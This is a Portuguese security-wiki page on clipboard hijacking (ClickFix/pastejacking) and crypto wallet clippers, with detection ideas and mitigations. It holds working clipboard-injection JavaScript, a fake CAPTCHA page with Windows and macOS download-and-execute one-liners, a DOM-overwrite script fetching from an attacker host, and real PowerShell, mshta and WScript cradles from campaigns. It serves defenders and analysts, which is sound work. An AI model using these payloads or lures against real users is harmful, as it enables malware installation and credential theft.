# Ataques de Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Nunca cole nada que você não tenha copiado pessoalmente." – conselho antigo, mas ainda válido

## Visão geral

Clipboard hijacking – também conhecido como *pastejacking* – explora o fato de que os usuários rotineiramente copiam e colam comandos sem inspecioná-los. Uma página web maliciosa (ou qualquer contexto compatível com JavaScript, como um aplicativo Electron ou Desktop) coloca programaticamente um texto controlado pelo atacante na área de transferência do sistema. As vítimas são incentivadas, normalmente por instruções de engenharia social cuidadosamente elaboradas, a pressionar **Win + R** (diálogo Executar), **Win + X** (Acesso rápido / PowerShell) ou abrir um terminal e *colar* o conteúdo da área de transferência, executando imediatamente comandos arbitrários.

Como **nenhum arquivo é baixado e nenhum anexo é aberto**, a técnica contorna a maioria dos controles de segurança de e-mail e conteúdo web que monitoram anexos, macros ou execução direta de comandos. Por isso, o ataque é popular em campanhas de phishing que distribuem famílias de malware comuns, como NetSupport RAT, loader Latrodectus ou Lumma Stealer.<sup>[[1]](#references)</sup>

## Clippers de substituição de endereços de wallet

Outra variante de **clipboard hijacking** não cola comandos: ela espera até que a vítima copie um **endereço de wallet de criptomoeda** e então o troca silenciosamente por um controlado pelo atacante pouco antes da colagem. Isso é especialmente eficaz contra formatos longos de wallet, porque os usuários geralmente verificam apenas os primeiros e últimos caracteres.<sup>[[8]](#references)</sup>

Características comuns no mundo real:
- **Loader fino + payload aninhado**: o aplicativo/exe visível parece uma ferramenta legítima de trading ou de "lucro", enquanto o clipper real está oculto em uma camada mais profunda do bundle (por exemplo, um loader .NET iniciando um payload Rust aninhado).
- **Substituição orientada por regex**: o malware identifica strings como `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` ou até strings genéricas semelhantes às de Solana com **44 caracteres**, e as reescreve para wallets do atacante.
- **Rotação de wallets em grande escala**: samples modernos de Windows podem incluir **milhares** de wallets de substituição por moeda, em vez de um único endereço estático, reduzindo o desgaste da reputação da wallet após cada roubo.<sup>[[8]](#references)</sup>

### Fluxo de um clipper no Windows

Uma implementação comum é uma janela oculta registrada com **`AddClipboardFormatListener`**. A cada atualização da área de transferência, o malware normalmente chama:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → acessar os dados atuais da área de transferência.
- **`GetClipboardData`** → ler o texto.
- **`EmptyClipboard`** + **`SetClipboardData`** → substituir a string da wallet pelo valor do atacante.

Regexes mínimos de hunting frequentemente observados em clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
A persistência no nível do usuário é suficiente para causar impacto. Um padrão observado é:<sup>[[8]](#references)</sup>
- Copiar o payload para **`%APPDATA%\silke\silke.exe`**
- Criar um **LNK na pasta Startup** em `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideias de detecção:
- Processos que chamam APIs da área de transferência continuamente enquanto também gravam em `%APPDATA%` e na pasta **Startup** do usuário.
- Criação de novos LNK/executáveis seguida por alterações nos endereços de wallet na área de transferência.
- Archives ou bundles de software falso contendo muitos arquivos não utilizados, além de um pequeno launcher que inicia um binary aninhado.

### Remoção de quarantine por engenharia social no macOS + persistência com LaunchAgent

No macOS, algumas campanhas distribuem um helper **`unlocker.command`** e instruem a vítima a clicar com o botão direito → **Open** caso o Gatekeeper informe que o app está danificado ou é de um desenvolvedor não identificado. O script simplesmente remove a quarantine e inicia o `.app` próximo:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Isso **não** é um exploit do **Gatekeeper**; é um **bypass de quarantine por engenharia social** que abusa do fato de que as decisões do Gatekeeper dependem do xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Após a execução, o clipper pode persistir como o usuário atual gravando:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – script wrapper
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent com `RunAtLoad` e `KeepAlive`

Um detalhe defensivo útil é que alguns samples implementam um **watchdog self-healing** que reescreve o LaunchAgent e o wrapper a cada ~30 segundos. Se você remover o plist primeiro **sem encerrar o processo em execução**, o malware poderá recriá-lo imediatamente.<sup>[[8]](#references)</sup> Ordem segura de limpeza:
1. Encerre o processo ativo do clipper.
2. Faça unload/exclua o plist do LaunchAgent.
3. Exclua `~/launch.sh` e o payload copiado.

### Nota sobre a entrega: reputação falsa como multiplicador de força

Para essa família, o malware pode permanecer tecnicamente simples enquanto a **camada de distribuição** faz o trabalho pesado: stars/forks falsos no GitHub, reviews/downloads no SourceForge, comentários/visualizações em tutoriais do YouTube e comentários/votos aparentemente benignos no VirusTotal são usados para fazer o binário parecer confiável antes da execução.<sup>[[8]](#references)</sup>

## Botões de cópia forçada e payloads ocultos (one-liners do macOS)

Alguns infostealers do macOS clonam sites de instaladores (por exemplo, o Homebrew) e **forçam o uso de um botão “Copy”** para que os usuários não possam selecionar apenas o texto visível. A entrada da área de transferência contém o comando de instalação esperado mais um payload Base64 anexado (por exemplo, `...; echo <b64> | base64 -d | sh`), portanto um único paste executa ambos enquanto a UI oculta o estágio adicional.<sup>[[5]](#references)</sup>

## Proof-of-Concept em JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Campanhas mais antigas usavam `document.execCommand('copy')`; as mais recentes dependem da **Clipboard API** assíncrona (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## O Fluxo ClickFix / ClearFake

1. O usuário acessa um site typosquatted ou comprometido (por exemplo, `docusign.sa[.]com`)
2. O JavaScript **ClearFake** injetado chama um helper `unsecuredCopyToClipboard()` que armazena silenciosamente um one-liner do PowerShell codificado em Base64 na área de transferência.
3. As instruções HTML dizem à vítima: *“Pressione **Win + R**, cole o comando e pressione Enter para resolver o problema.”*
4. `powershell.exe` é executado e baixa um archive que contém um executável legítimo e uma DLL maliciosa (classic DLL sideloading).
5. O loader descriptografa estágios adicionais, injeta shellcode e instala persistence (por exemplo, uma scheduled task), executando, em última instância, NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Exemplo de Cadeia do NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart legítimo) procura por `msvcp140.dll` em seu diretório.
* A DLL maliciosa resolve APIs dinamicamente com **GetProcAddress**, baixa dois binários (`data_3.bin`, `data_4.bin`) via **curl.exe**, descriptografa-os usando uma chave XOR rotativa `"https://google.com/"`, injeta o shellcode final e descompacta **client32.exe** (NetSupport RAT) em `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Baixa `la.txt` com **curl.exe**
2. Executa o downloader JScript dentro do **cscript.exe**
3. Obtém um payload MSI → grava `libcef.dll` ao lado de um aplicativo assinado → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
A chamada **mshta** inicia um script oculto do PowerShell que obtém `PartyContinued.exe`, extrai `Boat.pst` (CAB), reconstrói `AutoIt3.exe` por meio de `extrac32` e concatenação de arquivos e, por fim, executa um script `.a3x` que exfiltra credenciais do navegador para `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK com C2 rotativo (PureHVNC)

Algumas campanhas de ClickFix ignoram completamente os downloads de arquivos e instruem as vítimas a colar uma one-liner que obtém e executa JavaScript via WSH, estabelece persistência e alterna o C2 diariamente. Cadeia observada como exemplo:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Principais características
- URL ofuscada invertida em runtime para evitar inspeção casual.
- JavaScript persiste por meio de um Startup LNK (WScript/CScript) e seleciona o C2 com base no dia atual, permitindo uma rotação rápida de domínios.<sup>[[3]](#references)</sup>

Fragmento mínimo de JS usado para alternar entre C2s por data:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
A próxima etapa geralmente implanta um loader que estabelece persistência e obtém um RAT (por exemplo, PureHVNC), frequentemente fixando o TLS a um certificado hardcoded e dividindo o tráfego em chunks.<sup>[[3]](#references)</sup>

Ideias de detecção específicas para esta variante
- Árvore de processos: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ou `cscript.exe`).
- Artefatos de inicialização: LNK em `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invocando WScript/CScript com um caminho JS sob `%TEMP%`/`%APPDATA%`.
- Telemetria do Registry/RunMRU e da linha de comando contendo `.split('').reverse().join('')` ou `eval(a.responseText)`.
- Execuções repetidas de `powershell -NoProfile -NonInteractive -Command -` com grandes payloads via stdin para fornecer scripts longos sem linhas de comando extensas.
- Scheduled Tasks que posteriormente executam LOLBins, como `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, sob uma task/path com aparência de updater (por exemplo, `\GoogleSystem\GoogleUpdater`).

Caça a ameaças
- Hostnames e URLs de C2 que mudam diariamente, com o padrão `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlacionar eventos de escrita na clipboard seguidos de colagem com Win+R e execução imediata de `powershell.exe`.

Blue-teams podem combinar a telemetria da clipboard, de criação de processos e do Registry para identificar abusos de pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantém um histórico dos comandos do **Win + R** – procure entradas incomuns em Base64 / obfuscadas.
* Security Event ID **4688** (Process Creation) em que `ParentImage` == `explorer.exe` e `NewProcessName` esteja em { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** para criações de arquivos sob `%LocalAppData%\Microsoft\Windows\WinX\` ou pastas temporárias imediatamente antes do evento 4688 suspeito.
* Sensores de clipboard do EDR (se disponíveis) – correlacione `Clipboard Write` seguido imediatamente por um novo processo do PowerShell.

## Páginas de verificação no estilo IUAM (ClickFix Generator): cópia da clipboard para o console + payloads cientes do OS

Campanhas recentes produzem em massa páginas falsas de verificação de CDN/browser ("Just a moment…", no estilo IUAM) que induzem os usuários a copiar comandos específicos do OS da clipboard para consoles nativos. Isso desloca a execução para fora do sandbox do browser e funciona no Windows e no macOS.<sup>[[4]](#references)</sup>

Características principais das páginas geradas pelo builder
- Detecção do OS via `navigator.userAgent` para adaptar os payloads (Windows PowerShell/CMD versus macOS Terminal). Decoys/no-ops opcionais para OS não compatíveis mantêm a ilusão.
- Cópia automática para a clipboard em ações benignas da UI (checkbox/Copy), enquanto o texto visível pode diferir do conteúdo da clipboard.
- Bloqueio em dispositivos móveis e um popover com instruções passo a passo: Windows → Win+R→colar→Enter; macOS → abrir o Terminal→colar→Enter.
- Obfuscation opcional e injector de arquivo único para sobrescrever o DOM de um site comprometido com uma UI de verificação estilizada com Tailwind (sem necessidade de registrar um novo domínio).<sup>[[4]](#references)</sup>

Exemplo: incompatibilidade da clipboard + branching ciente do OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistência da execução inicial no macOS
- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que a execução continue após o fechamento do terminal, reduzindo artefatos visíveis.<sup>[[4]](#references)</sup>

Tomada de controle de página em sites comprometidos
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideias de detecção e hunting específicas para lures no estilo IUAM
- Web: Páginas que vinculam a Clipboard API a widgets de verificação; divergência entre o texto exibido e o payload da área de transferência; ramificação baseada em `navigator.userAgent`; Tailwind + substituição de página única em contextos suspeitos.
- Endpoint Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` pouco depois de uma interação com o navegador; instaladores batch/MSI executados a partir de `%TEMP%`.
- Endpoint macOS: Terminal/iTerm iniciando `bash`/`curl`/`base64 -d` com `nohup` próximo a eventos do navegador; jobs em segundo plano que sobrevivem ao fechamento do terminal.
- Correlacione o histórico `RunMRU` do Win+R e as gravações na área de transferência com a criação subsequente de processos de console.

Veja também as seguintes técnicas de apoio

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- O ClearFake continua comprometendo sites WordPress e injetando JavaScript loader que encadeia hosts externos (Cloudflare Workers, GitHub/jsDelivr) e até chamadas de “etherhiding” em blockchain (por exemplo, POSTs para endpoints da API da Binance Smart Chain, como `bsc-testnet.drpc[.]org`) para obter a lógica atual do lure. Overlays recentes usam intensamente fake CAPTCHAs que instruem os usuários a copiar/colar um one-liner (T1204.004), em vez de baixar qualquer coisa.<sup>[[6]](#references)</sup>
- A execução inicial é cada vez mais delegada a hosts de scripts assinados/LOLBAS. Em janeiro de 2026, as cadeias substituíram o uso anterior de `mshta` pelo `SyncAppvPublishingServer.vbs` integrado, executado via `WScript.exe`, passando argumentos semelhantes aos do PowerShell com aliases/wildcards para obter conteúdo remoto:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` é assinado e normalmente usado pelo App-V; combinado com `WScript.exe` e argumentos incomuns (aliases `gal`/`gcm`, cmdlets com curingas, URLs do jsDelivr), torna-se um estágio LOLBAS de alto sinal para o ClearFake.<sup>[[6]](#references)</sup>
- Em fevereiro de 2026, os payloads de CAPTCHA falsos voltaram a usar apenas download cradles do PowerShell. Dois exemplos ativos:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- A primeira chain é um grabber `iex(irm ...)` em memória; a segunda usa `WinHttp.WinHttpRequest.5.1`, grava um `.ps1` temporário e o executa com `-ep bypass` em uma janela oculta.<sup>[[6]](#references)</sup>

Dicas de detecção/hunting para essas variantes
- Linhagem de processos: navegador → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ou cradles do PowerShell imediatamente após gravações na clipboard/Win+R.
- Palavras-chave na linha de comando: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domínios do jsDelivr/GitHub/Cloudflare Worker ou padrões `iex(irm ...)` com IPs brutos.
- Rede: conexões de saída para hosts de CDN worker ou endpoints RPC de blockchain originadas de script hosts/PowerShell logo após a navegação na web.
- Arquivo/registro: criação de `.ps1` temporário em `%TEMP%` junto com entradas RunMRU contendo essas one-liners; bloquear/alertar quando LOLBAS assinados (WScript/cscript/mshta) forem executados com URLs externas ou strings de alias ofuscadas.

## Tradecraft do ClickFix em junho de 2026: telemetria de paste, comentários de verificação falsos e encadeamento de LOLBins

A telemetria recente da Red Canary mostra que o indicador estável **não é um comando exato**, mas a combinação de **paste-and-run assistido pelo usuário**, **interpretadores confiáveis/LOLBins**, **flags ofuscadas**, **recuperação remota** e **execução imediata**.<sup>[[7]](#references)</sup>

### Padrões operacionais notáveis

- **Telemetria de confirmação do paste**: alguns payloads chamam `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` antes do estágio real. Isso confirma a interação do usuário mantendo a janela curta e discreta.
- **Comentários de verificação falsos**: one-liners do PowerShell podem acrescentar strings como `# Security check ✔️ I'm not a robot Verification ID: 138105`, fazendo com que o comando ainda pareça relacionado a CAPTCHA depois de ser colado no Run / `cmd.exe` / histórico do PowerShell.
- **Reconstrução dinâmica de URL**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` evita uma URL estática na linha de comando enquanto ainda realiza download-and-execute em memória.
- **Execução de instalador disfarçado**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abusa de capitalização incomum e caracteres semelhantes a Unicode nas flags para burlar detecções frágeis, embora ainda se pareça com `msiexec.exe`.
- **Chains de LOLBins com escape por acento circunflexo**: `cmd.exe` pode ocultar palavras-chave com escapes `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), iniciar o shell aninhado minimizado, salvar o conteúdo do atacante com uma extensão benigna, como `.pdf`, e então executá-lo por meio do `mshta`.<sup>[[7]](#references)</sup>
## Mitigações

1. Hardening do navegador – desabilitar o acesso de escrita à clipboard (`dom.events.asyncClipboard.clipboardItem` etc.) ou exigir um gesto do usuário.
2. Conscientização em segurança – ensinar os usuários a *digitar* comandos sensíveis ou colá-los primeiro em um editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear one-liners arbitrárias.
4. Controles de rede – bloquear solicitações de saída para domínios conhecidos de pastejacking e C2 de malware.

## Tricks relacionados

* **Discord Invite Hijacking** frequentemente abusa da mesma abordagem ClickFix depois de atrair usuários para um servidor malicioso:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Corrija o clique: impedindo o vetor de ataque ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [PoC de Pastejacking – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Sob a Cortina Pura: de RAT a Builder e a Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [A fábrica do ClickFix: primeira exposição do gerador IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, o ano do Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Insights de inteligência: fevereiro de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Insights de inteligência: junho de 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – De estrelas a upvotes: reputação falsa alimentando um Clipboard Hijacker de cripto](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
